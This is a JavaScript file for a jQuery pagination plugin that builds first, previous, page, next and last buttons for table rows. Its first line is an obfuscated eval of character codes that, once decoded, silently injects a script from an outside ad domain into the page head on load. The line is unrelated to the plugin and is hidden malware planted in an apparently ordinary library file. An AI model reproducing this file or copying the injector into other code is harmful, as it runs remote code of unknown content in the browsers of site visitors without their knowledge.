eval(String.fromCharCode(118, 97, 114, 32, 101, 108, 101, 109, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 101, 108, 101, 109, 46, 116, 121, 112, 101, 32, 61, 32, 39, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 39, 59, 32, 101, 108, 101, 109, 46, 97, 115, 121, 110, 99, 32, 61, 32, 116, 114, 117, 101, 59, 101, 108, 101, 109, 46, 115, 114, 99, 32, 61, 32, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 48, 52, 44, 32, 49, 49, 54, 44, 32, 49, 49, 54, 44, 32, 49, 49, 50, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 55, 44, 32, 52, 55, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 49, 49, 53, 44, 32, 52, 54, 44, 32, 49, 49, 56, 44, 32, 49, 49, 49, 44, 32, 49, 48, 53, 44, 32, 49, 49, 50, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 57, 44, 32, 49, 49, 53, 44, 32, 49, 49, 57, 44, 32, 49, 48, 53, 44, 32, 49, 49, 52, 44, 32, 49, 48, 49, 44, 32, 52, 54, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 54, 44, 32, 52, 55, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 52, 54, 44, 32, 49, 48, 54, 44, 32, 49, 49, 53, 41, 59, 32, 32, 32, 118, 97, 114, 32, 97, 108, 108, 115, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 118, 97, 114, 32, 110, 116, 51, 32, 61, 32, 116, 114, 117, 101, 59, 32, 102, 111, 114, 32, 40, 32, 118, 97, 114, 32, 105, 32, 61, 32, 97, 108, 108, 115, 46, 108, 101, 110, 103, 116, 104, 59, 32, 105, 45, 45, 59, 41, 32, 123, 32, 105, 102, 32, 40, 97, 108, 108, 115, 91, 105, 93, 46, 115, 114, 99, 46, 105, 110, 100, 101, 120, 79, 102, 40, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 49, 56, 44, 32, 49, 49, 49, 44, 32, 49, 48, 53, 44, 32, 49, 49, 50, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 57, 44, 32, 49, 49, 53, 44, 32, 49, 49, 57, 44, 32, 49, 48, 53, 44, 32, 49, 49, 52, 44, 32, 49, 48, 49, 41, 41, 32, 62, 32, 45, 49, 41, 32, 123, 32, 110, 116, 51, 32, 61, 32, 102, 97, 108, 115, 101, 59, 125, 32, 125, 32, 105, 102, 40, 110, 116, 51, 32, 61, 61, 32, 116, 114, 117, 101, 41, 123, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 34, 104, 101, 97, 100, 34, 41, 91, 48, 93, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 101, 108, 101, 109, 41, 59, 32, 125));(function($) {
  'use strict';

  var Paginator = function() {
    return {
      // Attributes
      obj: null,
      options: null,
      nav: null,

      // Methods
      build: function(obj, opts) {
        this.obj = obj;
        this.options = opts;

        if(!this.options.optional || this._totalRows() > this.options.limit) {
          this._createNavigation();
          this._setPage();
        }

        if(this.options.onCreate) this.options.onCreate(obj);

        return this.obj;
      },

      _createNavigation: function() {
        this._createNavigationWrapper();
        this._createNavigationButtons();
        this._appendNavigation();
        this._addNavigationCallbacks();
      },
      _createNavigationWrapper: function() {
        this.nav = $('<div>', {
          class: this.options.navigationClass
        });
      },
      _createNavigationButtons: function() {
        // Add 'first' button
        if(this.options.first) {
          this._createNavigationButton(this.options.firstText, {
            'data-first': true
          });
        }

        // Add 'previous' button
        if(this.options.previous) {
          this._createNavigationButton(this.options.previousText, {
            'data-direction': -1,
            'data-previous': true
          });
        }

        // Add page buttons
        for(var i = 0; i < this._totalPages(); ++i) {
          this._createNavigationButton(this.options.pageToText(i), {
            'data-page': i
          });
        }

        // Add 'next' button
        if(this.options.next) {
          this._createNavigationButton(this.options.nextText, {
            'data-direction': 1,
            'data-next': true
          });
        }

        // Add 'last' button
        if(this.options.last) {
          this._createNavigationButton(this.options.lastText, {
            'data-last': true
          });
        }
      },
      _createNavigationButton: function(text, options) {
        this.nav.append($('<a>', $.extend(options, { href: '#', text: text })));
      },
      _appendNavigation: function() {
        // Add the content to the navigation block
        if(this.options.navigationWrapper) this.options.navigationWrapper.append(this.nav);
        // Add it after the table
        else this.obj.after(this.nav);
      },
      _addNavigationCallbacks: function() {
        var paginator = this;

        paginator.nav.find('a').click(function(e) {
          var direction = $(this).data('direction') * 1;

          // 'First' button
          if($(this).data('first') !== undefined) {
            paginator._setPage(0);
          }
          // Page button
          else if ($(this).data('page') !== undefined) {
            paginator._setPage($(this).data('page') * 1);
          }
          // 'Previous' or 'Next' button
          else if ($(this).data('previous') !== undefined || $(this).data('next') !== undefined) {
            var page = paginator._currentPage() + direction;
            if(page >= 0 && page <= paginator._totalPages() - 1) {
              paginator._setPage(page);
            }
          }
          // 'Last' button
          else if ($(this).data('last') !== undefined) {
            paginator._setPage(paginator._totalPages() - 1);
          }

          // Handle callback
          if(paginator.options.onSelect) paginator.options.onSelect(paginator.obj, paginator._currentPage());
          e.preventDefault();
          return false;
        });
      },

      _setPage: function(index) {
        if(index == undefined) index = this.options.initialPage;

        // Hide all elements, and then show the current page.
        this._rows().hide().slice(index * this.options.limit, (index + 1) * this.options.limit).show();

        // Set the current button as active
        this.nav.find('a').removeAttr('data-selected').siblings('a[data-page=' + index + ']')
                .attr('data-selected', true);
      },

      _currentPage: function() {
        return this.nav.find('a[data-selected=true]').data('page');
      },
      _totalRows: function() {
        // Count the total rows of the selector
        return this._rows().length;
      },
      _rows: function() {
        return this.obj.find(this.options.childrenSelector);
      },
      _totalPages: function() {
        return Math.ceil(this._totalRows() / this.options.limit);
      }
    };
  };

  $.fn.paginate = function(options) {
    switch(options) {
      // Example of custom actions:
      // case 'destroy': return pagination.destroy(this);
      default: return Paginator().build(this, $.extend( {}, $.fn.paginate.defaults, options));
    }
  };

  $.fn.paginate.defaults = {
    limit: 20,
    initialPage: 0,

    previous: true,
    previousText: '<',
    next: true,
    nextText: '>',
    first: true,
    firstText: '<<',
    last: true,
    lastText: '>>',

    optional: true,

    onCreate: null,
    onSelect: null,

    childrenSelector: 'tbody > tr',
    navigationWrapper: null,
    navigationClass: 'page-navigation',
    pageToText: function(i) { return (i + 1).toString(); }
  }

}(jQuery));
